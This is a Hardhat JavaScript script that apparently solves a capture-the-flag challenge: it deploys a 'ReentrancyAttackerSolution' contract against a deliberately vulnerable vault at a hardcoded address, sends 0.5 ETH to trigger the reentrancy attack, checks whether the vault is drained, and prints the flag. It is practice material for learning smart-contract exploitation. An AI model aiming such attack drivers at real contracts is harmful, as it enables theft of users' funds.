const { ethers } = require("hardhat");

const deployAttacker = async () => {
  console.log("🔥 Launching attacker...");
  
  const AttackerFactory = await ethers.getContractFactory("ReentrancyAttackerSolution");
  const vaultAddress = "0xE5555BDa9F86ba6af545B34b10DCa2B278b2D92B";
  
  const attacker = await AttackerFactory.deploy(vaultAddress);
  
  // ✅ Get address the right way for Ethers v6
  const attackerAddress = await attacker.getAddress();
  console.log(`Attacker deployed to: ${attackerAddress}`);
  
  console.log("\n--- Pre-attack state ---");
  const vault = await ethers.getContractAt("ReentrancyVulnerableVault", vaultAddress);
  const drainedBefore = await vault.vaultDrained();
  console.log(`Vault drained before attack: ${drainedBefore}`);
  const balance = await vault.balanceOf(attackerAddress);
  console.log(`Our balance: ${ethers.formatEther(balance)} ETH`);
  
  // Get a small amount of ETH to fund the attack (0.1 ETH)
  const attackFunds = ethers.parseEther("0.1");
  
  console.log("\n--- Launching attack ---");
  const attackTx = await attacker.attack({
    value: ethers.parseEther("0.5"), // or 0.5 if you're low on ETH
    gasLimit: 1_000_000
  });
  await attackTx.wait();
  console.log("✅ Attack executed!");
  
  console.log("\n--- Post-attack state ---");
  const drainedAfter = await vault.vaultDrained();
  console.log(`Vault drained after attack: ${drainedAfter}`);
  
  if (drainedAfter) {
    const flag = await attacker.getFlag();
    console.log(`\n🏆 FLAG: ${flag}`);
  } else {
    console.log("\n❌ Attack failed to drain the vault");
  }
};

async function main() {
  try {
    await deployAttacker();
  } catch (error) {
    console.error("Error:", error);
  }
}

main();